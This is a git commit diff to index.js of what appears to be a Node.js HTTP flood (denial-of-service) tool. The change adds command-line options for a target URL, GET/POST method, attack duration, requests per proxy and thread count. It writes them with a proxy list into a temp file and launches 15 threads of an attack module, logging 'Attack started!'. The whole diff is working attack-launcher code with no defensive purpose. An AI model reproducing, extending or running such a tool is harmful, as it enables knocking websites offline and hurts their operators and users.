bc341a560667b764b0f795a12e1a4dc6187c9e13
hexify <36350571+hexify1337@users.noreply.github.com>
2020-08-31 15:38:21 -0300

    final

--- index.js
+++ index.js
@@ -1,4 +1,5 @@
 const fs = require('fs')
+const { Command } = require('commander')
 
 const log = require('./modules/logger')
 const thread = require('./modules/threads')
@@ -7,16 +8,33 @@ var temp = `${__dirname}\\temp.json`
 
 log.banner()
 
-// if (fs.existsSync(temp))
-//     fs.unlinkSync(temp)
+const program = new Command()
 
-// fs.writeFile(temp, `{ "host": "", "time": "10" }`, function(err)
-// {
-    // if(err)
-    //     return log.error('error on create temp.json.')
+program.version('1.0.0')
+
+program.option('-u, --url <link>', 'target url')
+program.option('-m, --method <GET, POST>', 'attack method')
+program.option('-t, --time <length>', 'attack time')
+program.option('-r, --reqs <length>', 'req per proxy connection')
+program.option('-th, --threads <length>', 'threads per attack')
+
+program.parse(process.argv)
+
+if (!program.url || !program.method || !program.time || !program.reqs || !program.threads) 
+    return log.error('you lacked to define something!')
+
+if (fs.existsSync(temp))
+    fs.unlinkSync(temp)
+
+fs.writeFile(temp, `{ "proxies": "proxy.txt", "method": "${program.method}", "url" : "${program.url}", "time": ${program.time}, "reqpproxy": ${program.reqs} }`, function (err) 
+{
+    if (err)
+        return log.error('error on create temp.json.')
 
     for (var i = 0; i < 15; i++) 
+    {
         thread.CreateThread(`${__dirname}\\modules\\attack.js`)
-// })
+    }
 
-log.success("Attack started!")
+    log.success("Attack started!")
+})
